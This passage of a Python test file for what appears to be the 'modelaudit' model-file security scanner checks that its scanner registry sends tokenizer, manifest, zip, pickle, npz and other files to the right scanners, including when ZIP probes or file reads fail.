        encoding="utf-8",
    )

    _assert_scanner_for_path(manifest_path, "manifest")

    result = scan_file(str(manifest_path), config={"cache_scan_results": False})

    assert result.scanner_name == "manifest"
    assert result.success is True


def test_manifest_metadata_does_not_claim_tokenizer_exact_filenames() -> None:
    manifest_filenames = set(SCANNER_REGISTRY_METADATA["manifest"].get("content_routed_filenames", []))

    assert "tokenizer.json" not in manifest_filenames
    assert "tokenizer_config.json" not in manifest_filenames


def test_get_scanner_for_path_does_not_route_hf_tokenizer_json_to_generic_json_scanners(tmp_path: Path) -> None:
    tokenizer_path = tmp_path / "tokenizer.json"
    tokenizer_path.write_text(
        json.dumps(
            {
                "version": "1.0",
                "added_tokens": [],
                "model": {"type": "BPE", "vocab": {"hello": 0}, "merges": []},
            }
        ),
        encoding="utf-8",
    )

    scanner_class = ScannerRegistry().get_scanner_for_path(str(tokenizer_path))

    assert scanner_class is None or scanner_class.name not in {"manifest", "jinja2_template", "mxnet", "xgboost"}


def test_get_scanner_for_path_routes_declared_manifest_paths_to_manifest_scanner(tmp_path: Path) -> None:
    hyperparams_path = tmp_path / "hyperparams.yaml"
    hyperparams_path.write_text("model_type: bert\n", encoding="utf-8")
    manifest_path = tmp_path / "artifact.manifest"
    manifest_path.write_text(json.dumps({"model_type": "bert"}), encoding="utf-8")

    _assert_scanner_for_path(hyperparams_path, "manifest")
    _assert_scanner_for_path(manifest_path, "manifest")


def test_get_scanner_for_path_routes_generic_pkl_zip_without_pytorch_markers_to_zip(tmp_path: Path) -> None:
    model_path = _write_zip_archive(tmp_path / "generic.pkl", {"payload.txt": b"not a pytorch archive"})

    _assert_scanner_for_path(model_path, "zip")


@pytest.mark.parametrize(
    ("filename", "scanner_name"),
    [
        ("README", "text"),
        ("README.md", "text"),
        ("model_card", "text"),
        ("unreadable.npy", "numpy"),
        ("unreadable.pdmodel", "paddle"),
        ("unreadable.bin", "pytorch_binary"),
        ("unreadable.pb", "tf_savedmodel"),
        ("config.json", "manifest"),
        ("vocab.txt", "text"),
    ],
)
def test_get_scanner_for_path_preserves_read_failure_aware_owner_after_failed_zip_probe(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    filename: str,
    scanner_name: str,
) -> None:
    path = tmp_path / filename
    path.write_bytes(b"owned unreadable model payload")

    def raise_zip_error(_path: str) -> bool:
        raise OSError("simulated ZIP probe read failure")

    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_zip_error)
    monkeypatch.setattr("modelaudit.scanners.paddle_scanner.HAS_PADDLE", True)

    scanner_class = ScannerRegistry().get_scanner_for_path(str(path))

    assert scanner_class is not None
    assert scanner_class.name == scanner_name


def test_get_scanner_for_path_preserves_npz_zip_owner_after_failed_zip_probe_read_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = _write_zip_archive(tmp_path / "unreadable.npz", {"weights.npy": b"safe array payload"})

    def raise_zip_error(*_args: object, **_kwargs: object) -> bool:
        raise OSError("simulated ZIP probe read failure")

    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_zip_error)
    monkeypatch.setattr("modelaudit.scanners.zip_scanner.zipfile.ZipFile", raise_zip_error)

    scanner_class = ScannerRegistry().get_scanner_for_path(str(path))

    assert scanner_class is not None
    assert scanner_class.name == "zip"


def test_get_scanner_for_path_does_not_claim_pickle_after_failed_zip_probe(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "unreadable.pkl"
    path.write_bytes(b"unreadable generic pickle candidate")

    def raise_zip_error(_path: str) -> bool:
        raise OSError("simulated ZIP probe read failure")

    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_zip_error)

    assert ScannerRegistry().get_scanner_for_path(str(path)) is None


def test_get_scanner_for_path_does_not_claim_generic_text_after_failed_zip_probe(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = tmp_path / "notes.txt"
    path.write_text("ordinary notes\n", encoding="utf-8")

    def raise_zip_error(_path: str) -> bool:
        raise OSError("simulated ZIP probe read failure")

    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_zip_error)

    assert ScannerRegistry().get_scanner_for_path(str(path)) is None


@pytest.mark.parametrize(
    ("filename", "scanner_name"),
    [
        ("unavailable.mlmodel", "coreml"),
        ("unavailable.onnx", None),
        ("unavailable.rds", "r_serialized"),
    ],
)
def test_get_scanner_for_path_limits_unreadable_extension_routing_to_read_failure_aware_scanners(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    filename: str,
    scanner_name: str | None,
) -> None:
    path = tmp_path / filename
    path.write_bytes(b"X\nsafe\nmodel")
    real_access = os.access

    def unreadable_path(candidate: str, mode: int) -> bool:
        return False if candidate == str(path) and mode == os.R_OK else real_access(candidate, mode)

    monkeypatch.setattr(os, "access", unreadable_path)

    scanner_class = ScannerRegistry().get_scanner_for_path(str(path))

    if scanner_name is None:
        assert scanner_class is None
    else:
        assert scanner_class is not None
        assert scanner_class.name == scanner_name
